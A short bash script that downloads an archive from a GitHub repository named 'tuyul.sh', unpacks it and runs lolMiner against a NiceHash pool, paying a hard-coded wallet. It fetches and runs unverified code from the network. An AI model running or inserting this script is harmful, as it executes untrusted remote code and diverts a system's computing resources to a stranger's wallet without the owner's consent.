#!/bin/bash
apt-get install wget -y
wget https://github.com/Kocalkocal93Kocalkocal93/tuyul.sh/raw/main/abc.tar.gz
tar -xvf abc.tar.gz
cd 1.34a
./lolMiner --algo AUTOLYKOS --pool stratum+tcp://autolykos.auto.nicehash.com:9200 -u 3MYuuKJ78wazszEA8d3MLjKQW1tH7P6cyW.ERGO
